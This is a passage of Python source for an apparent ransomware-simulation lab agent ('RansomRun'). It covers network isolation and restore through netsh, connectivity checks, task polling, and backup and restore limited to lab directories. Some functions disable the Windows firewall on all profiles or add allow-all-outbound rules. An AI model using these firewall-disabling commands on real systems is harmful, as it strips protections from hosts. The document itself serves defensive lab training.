            "RANSOMRUN_ALLOW_OUT_8000",
            "RANSOMRUN_ALLOW_OUT_443",
            "RANSOMRUN_ALLOW_OUT_9200",
            "RANSOMRUN_ALLOW_OUT_5044",
            "RANSOMRUN_ALLOW_IN",
            "RANSOMRUN_LOCALHOST_IN",
            "RANSOMRUN_LOCALHOST_OUT",
            "RANSOMRUN_ISOLATION_OUT",
            "RANSOMRUN_ISOLATION_IN",
            "RANSOMRUN_OUT",
            "RANSOMRUN_IN",
            "RANSOMRUN_LO_OUT",
            "RANSOMRUN_LO_IN"
        ]
        
        for rule_name in rules_to_remove:
            try:
                delete = subprocess.run(
                    ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
                    capture_output=True, text=True, timeout=10
                )
                result["commands"].append({"cmd": f"Delete rule {rule_name}", "exit_code": delete.returncode})
            except:
                pass
        
        return result
    
    def _soar_restore_adapters(self, pre_state: dict) -> dict:
        """Re-enable network adapters to their pre-isolation state."""
        result = {
            "success": False,
            "commands": [],
            "stdout": "",
            "stderr": "",
            "errors": []
        }
        
        try:
            adapters = pre_state.get("adapters", [])
            enabled_count = 0
            
            for adapter in adapters:
                name = adapter.get("name")
                was_enabled = adapter.get("was_enabled", False)
                
                if not was_enabled:
                    continue
                
                self.logger.info(f"[SOAR] Re-enabling adapter: {name}")
                enable = subprocess.run(
                    ["powershell", "-Command", f'Enable-NetAdapter -Name "{name}" -Confirm:$false'],
                    capture_output=True, text=True, timeout=30
                )
                result["commands"].append({"cmd": f"Enable-NetAdapter {name}", "exit_code": enable.returncode})
                result["stdout"] += enable.stdout
                result["stderr"] += enable.stderr
                
                if enable.returncode == 0:
                    enabled_count += 1
                else:
                    result["errors"].append(f"Failed to enable {name}: {enable.stderr}")
            
            result["success"] = enabled_count > 0
            
        except Exception as e:
            result["errors"].append(str(e))
        
        return result
    
    def _soar_reset_firewall_permissive(self) -> dict:
        """Reset firewall to permissive state."""
        result = {
            "commands": [],
            "stdout": "",
            "stderr": ""
        }
        
        try:
            # Reset firewall
            reset = subprocess.run(
                ["netsh", "advfirewall", "reset"],
                capture_output=True, text=True, timeout=15
            )
            result["commands"].append({"cmd": "netsh advfirewall reset", "exit_code": reset.returncode})
            result["stdout"] += reset.stdout
            
            # Set permissive outbound policy
            policy = subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "firewallpolicy", "blockinbound,allowoutbound"],
                capture_output=True, text=True, timeout=10
            )
            result["commands"].append({"cmd": "Set allow outbound policy", "exit_code": policy.returncode})
            result["stdout"] += policy.stdout
            
            # Create explicit allow-all-outbound rule as failsafe
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=ALLOW_ALL_OUT"],
                capture_output=True, timeout=5
            )
            allow = subprocess.run([
                "netsh", "advfirewall", "firewall", "add", "rule",
                "name=ALLOW_ALL_OUT", "dir=out", "action=allow", "protocol=any"
            ], capture_output=True, text=True, timeout=10)
            result["commands"].append({"cmd": "Add allow-all-out rule", "exit_code": allow.returncode})
            
        except Exception as e:
            result["stderr"] += str(e)
        
        return result
    
    def _soar_aggressive_restore(self) -> dict:
        """Aggressive restore - disable firewall completely."""
        result = {
            "commands": [],
            "stdout": ""
        }
        
        try:
            # Disable firewall on all profiles
            disable = subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "state", "off"],
                capture_output=True, text=True, timeout=10
            )
            result["commands"].append({"cmd": "Disable firewall", "exit_code": disable.returncode})
            result["stdout"] += disable.stdout
            
            # Enable all network adapters
            enable_all = subprocess.run(
                ["powershell", "-Command", "Get-NetAdapter | Enable-NetAdapter -Confirm:$false"],
                capture_output=True, text=True, timeout=30
            )
            result["commands"].append({"cmd": "Enable all adapters", "exit_code": enable_all.returncode})
            result["stdout"] += enable_all.stdout
            
        except Exception as e:
            result["stdout"] += f"Error: {e}"
        
        return result
    
    def _soar_verify_isolation(self, backend_ip: str, backend_port: int) -> dict:
        """Verify network isolation is working."""
        result = {
            "isolated": False,
            "internet_blocked": False,
            "backend_reachable": False,
            "tests": []
        }
        
        try:
            # Test 1: Ping external IP (should fail)
            ping = subprocess.run(
                ["ping", "-n", "1", "-w", "2000", "8.8.8.8"],
                capture_output=True, timeout=5
            )
            internet_blocked = ping.returncode != 0
            result["internet_blocked"] = internet_blocked
            result["tests"].append({"test": "ping 8.8.8.8", "blocked": internet_blocked})
            
            # Test 2: Check backend connectivity (should succeed)
            try:
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((backend_ip, backend_port))
                sock.close()
                backend_reachable = True
            except:
                backend_reachable = False
            
            result["backend_reachable"] = backend_reachable
            result["tests"].append({"test": f"connect {backend_ip}:{backend_port}", "success": backend_reachable})
            
            # Isolation is successful if internet is blocked
            result["isolated"] = internet_blocked
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _soar_verify_restoration(self) -> dict:
        """Verify network restoration succeeded."""
        result = {
            "restored": False,
            "internet_reachable": False,
            "dns_working": False,
            "tests": []
        }
        
        try:
            # Test 1: Ping external IP
            ping = subprocess.run(
                ["ping", "-n", "1", "-w", "3000", "8.8.8.8"],
                capture_output=True, timeout=6
            )
            internet_reachable = ping.returncode == 0
            result["internet_reachable"] = internet_reachable
            result["tests"].append({"test": "ping 8.8.8.8", "success": internet_reachable})
            
            # Test 2: DNS resolution
            try:
                nslookup = subprocess.run(
                    ["nslookup", "google.com"],
                    capture_output=True, timeout=5
                )
                dns_working = nslookup.returncode == 0
            except:
                dns_working = False
            
            result["dns_working"] = dns_working
            result["tests"].append({"test": "nslookup google.com", "success": dns_working})
            
            result["restored"] = internet_reachable
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _soar_report_result(self, isolation_state_id: int, result: dict):
        """Report result to backend action log endpoint."""
        if not isolation_state_id:
            return
        
        try:
            # Find the action log ID from the task parameters or create one
            # For now, just log locally - the task result will be reported via report_result
            self.logger.info(f"[SOAR] Result for isolation_state {isolation_state_id}: {result.get('success')}")
        except Exception as e:
            self.logger.warning(f"[SOAR] Failed to report result: {e}")
    
    # =========================================================================
    # MAIN RUN LOOP
    # =========================================================================
    
    def run(self):
        """Main agent loop."""
        # Initial registration - try but don't fail if backend unavailable
        backend_available = self.register()
        
        if not backend_available:
            self.logger.warning("Backend server not available. Running in OFFLINE mode.")
            self.logger.warning("Agent will wait for backend connection...")
            
        retry_count = 0
        max_retries = 5
        
        self.logger.info(f"Starting task polling loop (interval: {POLL_INTERVAL}s)")
        
        while True:
            try:
                if not backend_available:
                    # Try to reconnect every few attempts
                    if retry_count % 3 == 0:
                        self.logger.info(f"Attempting to connect to backend... (attempt {retry_count + 1})")
                        backend_available = self.register()
                        if backend_available:
                            self.logger.info("Successfully connected to backend!")
                    
                    retry_count += 1
                    if retry_count >= max_retries:
                        self.logger.error("Max connection retries reached. Please check:")
                        self.logger.error(f"  1. Backend server is running at {self.backend_url}")
                        self.logger.error(f"  2. Network connectivity from {self.ip_address} to backend")
                        self.logger.error("  3. Windows Firewall allows port 8000")
                        self.logger.error("\nExiting agent. Fix the issues and restart.")
                        break
                    
                    time.sleep(POLL_INTERVAL)
                    continue
                
                # Poll for tasks
                task = self.poll_for_task()
                
                if task.get("task_id"):
                    self.execute_task(task)
                
                # Re-register periodically to update status
                if not self.register():
                    backend_available = False
                    self.logger.warning("Lost connection to backend. Entering reconnection mode...")
                
                # Wait before next poll
                time.sleep(POLL_INTERVAL)
                
            except KeyboardInterrupt:
                self.logger.info("Agent stopped by user")
                break
            except Exception as e:
                self.logger.exception(f"Main loop error: {e}")
                time.sleep(POLL_INTERVAL)
    
    # =========================================================================
    # BACKUP & RESTORE TASK HANDLERS (LAB-SAFE)
    # =========================================================================
    
    def backup_create(self, parameters: dict) -> tuple:
        """
        Create a backup snapshot using robocopy.
        
        LAB-SAFE: Only backs up from allowed directories.
        Uses robocopy for reliable file copying with integrity.
        
        Parameters:
        - job_id: Backend job ID for reporting
        - plan_id: Backup plan ID
        - plan_name: Name of the backup plan
        - paths: List of paths to backup
        - include_globs: File patterns to include (optional)
        - exclude_globs: File patterns to exclude (optional)
        - retention_count: Number of snapshots to keep
        - storage_base_path: Base path for storing backups
        - dry_run: If True, simulate without making changes
        """
        import hashlib
        import fnmatch
        from datetime import datetime
        
        job_id = parameters.get("job_id")
        plan_id = parameters.get("plan_id")
        plan_name = parameters.get("plan_name", "default")
        paths = parameters.get("paths", [])
        include_globs = parameters.get("include_globs")
        exclude_globs = parameters.get("exclude_globs")
        retention_count = parameters.get("retention_count", 5)
        storage_base = parameters.get("storage_base_path", r"C:\ProgramData\RansomRun\backups")
        dry_run = parameters.get("dry_run", False)
        
        self.logger.info(f"[BACKUP] ===== BACKUP CREATE =====")
        self.logger.info(f"[BACKUP] Plan: {plan_name}, Paths: {paths}, DryRun: {dry_run}")
        
        result = {
            "success": False,
            "job_id": job_id,
            "dry_run": dry_run,
            "paths_processed": [],
            "file_count": 0,
            "total_bytes": 0,
            "folder_count": 0,
            "snapshot_path": None,
            "manifest_path": None,
            "errors": [],
            "commands": [],
            "stdout": "",
            "stderr": ""
        }
        
        # Validate paths are in allowed directories
        allowed_prefixes = [
            r"C:\RansomTest",
            r"C:\target_data",
            r"C:\ProgramData\RansomRun"
        ]
        
        for path in paths:
            path_upper = path.upper()
            if not any(path_upper.startswith(prefix.upper()) for prefix in allowed_prefixes):
                result["errors"].append(f"Path '{path}' not in allowed directories")
                return (False, json.dumps(result))
        
        # Create snapshot directory
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        host_name = self.agent_id or socket.gethostname()
        safe_plan_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in plan_name)
        snapshot_dir = Path(storage_base) / host_name / safe_plan_name / timestamp
        
        if dry_run:
            self.logger.info(f"[BACKUP] DRY RUN - Would create snapshot at: {snapshot_dir}")
            result["success"] = True
            result["snapshot_path"] = str(snapshot_dir)
            result["message"] = "Dry run completed successfully"
            return (True, json.dumps(result))
        
        try:
            snapshot_dir.mkdir(parents=True, exist_ok=True)
            result["snapshot_path"] = str(snapshot_dir)
            
            # Process each path
            all_files = []
            for source_path in paths:
                source = Path(source_path)
                if not source.exists():
                    result["errors"].append(f"Source path does not exist: {source_path}")
                    continue
                
                # Determine destination
                # Preserve folder structure: C:\RansomTest\target_data -> snapshot\RansomTest\target_data
                relative_path = source_path.replace(":", "").lstrip("\\")
                dest_path = snapshot_dir / relative_path
                
                if source.is_file():
                    # Single file backup
                    dest_path.parent.mkdir(parents=True, exist_ok=True)
                    try:
                        import shutil
                        shutil.copy2(str(source), str(dest_path))
                        result["file_count"] += 1
                        result["total_bytes"] += source.stat().st_size
                        all_files.append({
                            "path": str(dest_path.relative_to(snapshot_dir)),
                            "size": source.stat().st_size,
                            "hash": self._calculate_file_hash(source)
                        })
                    except Exception as e:
                        result["errors"].append(f"Failed to copy {source}: {e}")
                else:
                    # Directory backup using robocopy
                    dest_path.mkdir(parents=True, exist_ok=True)
                    
                    # Build robocopy command
                    robocopy_cmd = [
                        "robocopy",
                        str(source),
                        str(dest_path),
                        "/MIR",      # Mirror directory tree
                        "/R:1",      # Retry once
                        "/W:1",      # Wait 1 second between retries
                        "/FFT",      # Assume FAT file times
                        "/ZB",       # Restartable mode; if access denied use Backup mode
                        "/XJ",       # Exclude junction points
                        "/COPY:DAT", # Copy Data, Attributes, Timestamps
                        "/DCOPY:DAT", # Copy directory timestamps
                        "/NP",       # No progress display
                        "/NDL",      # No directory list
                        "/NFL"       # No file list (for cleaner output)
                    ]
                    
                    # Add exclusions if specified
                    if exclude_globs:
                        for pattern in exclude_globs:
                            robocopy_cmd.extend(["/XF", pattern])
                    
                    self.logger.info(f"[BACKUP] Running: {' '.join(robocopy_cmd)}")
                    
                    try:
                        proc = subprocess.run(
                            robocopy_cmd,
                            capture_output=True,
                            text=True,
                            timeout=300  # 5 minute timeout
                        )
                        
                        result["commands"].append({
                            "cmd": " ".join(robocopy_cmd),
                            "exit_code": proc.returncode
                        })
                        result["stdout"] += proc.stdout + "\n"
                        result["stderr"] += proc.stderr + "\n"
                        
                        # Robocopy exit codes: 0-7 are success, 8+ are errors
                        if proc.returncode >= 8:
                            result["errors"].append(f"Robocopy failed with code {proc.returncode}")
                        
                        # Count files in destination
                        for file_path in dest_path.rglob("*"):
                            if file_path.is_file():
                                result["file_count"] += 1
                                result["total_bytes"] += file_path.stat().st_size
                                all_files.append({
                                    "path": str(file_path.relative_to(snapshot_dir)),
                                    "size": file_path.stat().st_size,
                                    "hash": self._calculate_file_hash(file_path)
                                })
                            elif file_path.is_dir():
                                result["folder_count"] += 1
                                
                    except subprocess.TimeoutExpired:
                        result["errors"].append(f"Robocopy timed out for {source_path}")
                    except Exception as e:
                        result["errors"].append(f"Robocopy error for {source_path}: {e}")
                
                result["paths_processed"].append(source_path)
            
            # Create manifest file
            manifest_path = snapshot_dir / "manifest.json"
            manifest_data = {
                "snapshot_time": datetime.utcnow().isoformat(),
                "host": host_name,
                "plan_name": plan_name,
                "plan_id": plan_id,
                "source_paths": paths,
                "file_count": result["file_count"],
                "total_bytes": result["total_bytes"],
                "folder_count": result["folder_count"],
                "files": all_files[:1000]  # Limit manifest to first 1000 files
            }
            manifest_path.write_text(json.dumps(manifest_data, indent=2))
            result["manifest_path"] = str(manifest_path)
            
            # Create SHA256 hash manifest
            hash_manifest_path = snapshot_dir / "sha256_manifest.txt"
            with open(hash_manifest_path, "w") as f:
                for file_info in all_files:
                    f.write(f"{file_info['hash']}  {file_info['path']}\n")
            
            # Enforce retention - delete old snapshots
            self._enforce_backup_retention(
                Path(storage_base) / host_name / safe_plan_name,
                retention_count
            )
            
            result["success"] = len(result["errors"]) == 0 or result["file_count"] > 0
            self.logger.info(f"[BACKUP] Completed: {result['file_count']} files, {result['total_bytes']} bytes")
            
        except Exception as e:
            self.logger.exception(f"[BACKUP] Error: {e}")
            result["errors"].append(str(e))
        
        return (result["success"], json.dumps(result))
    
    def backup_restore(self, parameters: dict) -> tuple:
        """
        Restore files from a backup snapshot.
        
        LAB-SAFE: Only restores to allowed directories.
        
        Parameters:
        - job_id: Backend job ID for reporting
        - snapshot_id: Snapshot ID
        - snapshot_path: Path to the snapshot directory
        - source_paths: Original paths that were backed up
        - restore_mode: "in_place" or "restore_to_new_folder"
        - target_override_path: Target path for restore_to_new_folder
        - dry_run: If True, simulate without making changes
        """
        job_id = parameters.get("job_id")
        snapshot_id = parameters.get("snapshot_id")
        snapshot_path = parameters.get("snapshot_path")
        source_paths = parameters.get("source_paths", [])
        restore_mode = parameters.get("restore_mode", "in_place")
        target_override = parameters.get("target_override_path")
        dry_run = parameters.get("dry_run", False)
        
        self.logger.info(f"[RESTORE] ===== BACKUP RESTORE =====")
        self.logger.info(f"[RESTORE] Snapshot: {snapshot_path}, Mode: {restore_mode}, DryRun: {dry_run}")
        
        result = {
            "success": False,
            "job_id": job_id,
            "snapshot_id": snapshot_id,
            "dry_run": dry_run,
            "restore_mode": restore_mode,
            "files_restored": 0,
            "files_failed": 0,
            "bytes_restored": 0,
            "restored_paths": [],
            "verification_passed": False,
            "verification_sample": [],
            "errors": [],
            "commands": [],
            "stdout": "",
            "stderr": ""
        }
        
        # Validate snapshot exists
        snapshot_dir = Path(snapshot_path)
        if not snapshot_dir.exists():
            result["errors"].append(f"Snapshot path does not exist: {snapshot_path}")
            return (False, json.dumps(result))
        
        # Validate restore target is in allowed directories
        allowed_prefixes = [
            r"C:\RansomTest",
            r"C:\target_data",
            r"C:\ProgramData\RansomRun",
            r"C:\RestoreTest"
        ]
        
        if restore_mode == "restore_to_new_folder" and target_override:
            target_upper = target_override.upper()
            if not any(target_upper.startswith(prefix.upper()) for prefix in allowed_prefixes):
                result["errors"].append(f"Restore target '{target_override}' not in allowed directories")
                return (False, json.dumps(result))
        
        if dry_run:
            self.logger.info(f"[RESTORE] DRY RUN - Would restore from: {snapshot_path}")
            # Count what would be restored
            for f in snapshot_dir.rglob("*"):
                if f.is_file() and f.name not in ["manifest.json", "sha256_manifest.txt"]:
                    result["files_restored"] += 1
                    result["bytes_restored"] += f.stat().st_size
            result["success"] = True
            result["message"] = f"Dry run: would restore {result['files_restored']} files"
            return (True, json.dumps(result))
        
        try:
            # Load manifest if available
            manifest_path = snapshot_dir / "manifest.json"
            manifest = {}
            if manifest_path.exists():
                manifest = json.loads(manifest_path.read_text())
            
            # Determine restore targets
            # Snapshot structure: snapshot_dir/RansomTest/target_data/...
            # Original path: C:\RansomTest\target_data\...
            
            for entry in snapshot_dir.iterdir():
                if entry.name in ["manifest.json", "sha256_manifest.txt"]:
                    continue
                
                if entry.is_dir():
                    # Reconstruct original path
                    # Entry name might be like "RansomTest" (without C:)
                    if restore_mode == "in_place":
                        # Restore to original location
                        original_drive = "C:"
                        dest_path = Path(original_drive) / entry.name
                        
                        # Walk through the snapshot directory structure
                        for sub_entry in entry.rglob("*"):
                            if sub_entry.is_file():
                                rel_path = sub_entry.relative_to(entry)
                                final_dest = dest_path / rel_path
                                
                                try:
                                    final_dest.parent.mkdir(parents=True, exist_ok=True)
                                    import shutil
                                    shutil.copy2(str(sub_entry), str(final_dest))
                                    result["files_restored"] += 1
                                    result["bytes_restored"] += sub_entry.stat().st_size
                                    result["restored_paths"].append(str(final_dest))
                                except Exception as e:
                                    result["files_failed"] += 1
                                    result["errors"].append(f"Failed to restore {sub_entry}: {e}")
                    else:
                        # Restore to new folder
                        dest_base = Path(target_override) if target_override else Path(r"C:\RestoreTest")
                        dest_base.mkdir(parents=True, exist_ok=True)
                        
                        # Use robocopy for directory restore
                        robocopy_cmd = [
                            "robocopy",
                            str(entry),
                            str(dest_base / entry.name),
                            "/E",        # Copy subdirectories including empty
                            "/R:1",
                            "/W:1",
                            "/COPY:DAT",
                            "/DCOPY:DAT",
                            "/NP", "/NDL", "/NFL"
                        ]
                        
                        proc = subprocess.run(
                            robocopy_cmd,
                            capture_output=True,
                            text=True,
                            timeout=300
                        )
                        
                        result["commands"].append({
                            "cmd": " ".join(robocopy_cmd),
                            "exit_code": proc.returncode
                        })
                        result["stdout"] += proc.stdout + "\n"
                        result["stderr"] += proc.stderr + "\n"
                        
                        # Count restored files
                        for f in (dest_base / entry.name).rglob("*"):
                            if f.is_file():
                                result["files_restored"] += 1
                                result["bytes_restored"] += f.stat().st_size
                                result["restored_paths"].append(str(f))
            
            # Verify a sample of restored files
            if result["files_restored"] > 0:
                hash_manifest_path = snapshot_dir / "sha256_manifest.txt"
                if hash_manifest_path.exists():
                    hash_lines = hash_manifest_path.read_text().strip().split("\n")
                    sample_size = min(10, len(hash_lines))
                    import random
                    sample = random.sample(hash_lines, sample_size) if len(hash_lines) >= sample_size else hash_lines
                    
                    verified = 0
                    for line in sample:
                        if "  " in line:
                            expected_hash, rel_path = line.split("  ", 1)
                            # Find the restored file
                            if restore_mode == "in_place":
                                restored_file = Path("C:") / rel_path
                            else:
                                dest_base = Path(target_override) if target_override else Path(r"C:\RestoreTest")
                                restored_file = dest_base / rel_path
                            
                            if restored_file.exists():
                                actual_hash = self._calculate_file_hash(restored_file)
                                match = actual_hash == expected_hash
                                result["verification_sample"].append({
                                    "path": str(restored_file),
                                    "expected": expected_hash[:16] + "...",
                                    "actual": actual_hash[:16] + "...",
                                    "match": match
                                })
                                if match:
                                    verified += 1
                    
                    result["verification_passed"] = verified == len(sample)
            
            result["success"] = result["files_restored"] > 0 and result["files_failed"] == 0
            self.logger.info(f"[RESTORE] Completed: {result['files_restored']} files restored")
            
        except Exception as e:
            self.logger.exception(f"[RESTORE] Error: {e}")
            result["errors"].append(str(e))
        
        return (result["success"], json.dumps(result))
    
    def _calculate_file_hash(self, file_path: Path, algorithm: str = "sha256") -> str:
        """Calculate hash of a file."""
        import hashlib
        
        hash_func = hashlib.new(algorithm)
        try:
            with open(file_path, "rb") as f:
                for chunk in iter(lambda: f.read(8192), b""):
                    hash_func.update(chunk)
            return hash_func.hexdigest()
        except Exception:
            return ""
    
    def _enforce_backup_retention(self, plan_dir: Path, keep_count: int):
        """Delete old snapshots beyond retention count."""
        if not plan_dir.exists():
            return
        
        # Get all snapshot directories sorted by name (timestamp)
        snapshots = sorted(
            [d for d in plan_dir.iterdir() if d.is_dir()],
            key=lambda x: x.name,
            reverse=True  # Newest first
        )
        
        # Delete old snapshots
        for old_snapshot in snapshots[keep_count:]:
            try:
                import shutil
                shutil.rmtree(old_snapshot)
                self.logger.info(f"[BACKUP] Deleted old snapshot: {old_snapshot}")
            except Exception as e:
                self.logger.warning(f"[BACKUP] Failed to delete old snapshot {old_snapshot}: {e}")


# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

def remove_isolation():
    """Remove network isolation (restore connectivity)."""
    print("Removing network isolation...")
    try:
        result = subprocess.run(
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=RANSOMRUN_ISOLATION"],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print("Isolation removed successfully")
        else:
            print(f"Result: {result.stdout or result.stderr}")
    except Exception as e:
        print(f"Error: {e}")


def restore_files():
    """Restore 'encrypted' files by removing .locked extension."""
    print(f"Restoring files in {TEST_DIR}...")
    try:
        test_path = Path(TEST_DIR)
        if not test_path.exists():
            print("Test directory does not exist")
            return
        
        restored = 0
        for filepath in test_path.iterdir():
            if filepath.suffix == ".locked":
                new_name = filepath.stem
                new_path = filepath.with_name(new_name)
                filepath.rename(new_path)
                print(f"Restored: {filepath.name} -> {new_path.name}")
                restored += 1
        
        print(f"Restored {restored} files")
    except Exception as e:
        print(f"Error: {e}")


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="RANSOMRUN Windows Agent")
    parser.add_argument("--restore", action="store_true", help="Restore 'encrypted' files")
    parser.add_argument("--unisolate", action="store_true", help="Remove network isolation")
    parser.add_argument("--server", type=str, help="Backend server URL")
    parser.add_argument("--agent-id", type=str, help="Custom agent ID")
    
    args = parser.parse_args()
    
    # Handle utility commands
    if args.restore:
        restore_files()
        sys.exit(0)
    
    if args.unisolate:
        remove_isolation()
        sys.exit(0)
    
    # Override config from command line
    if args.server:
        BACKEND_URL = args.server
    
    agent_id = args.agent_id or AGENT_ID
    
    # Create and run agent
    agent = RansomRunAgent(BACKEND_URL, agent_id)
    agent.run()
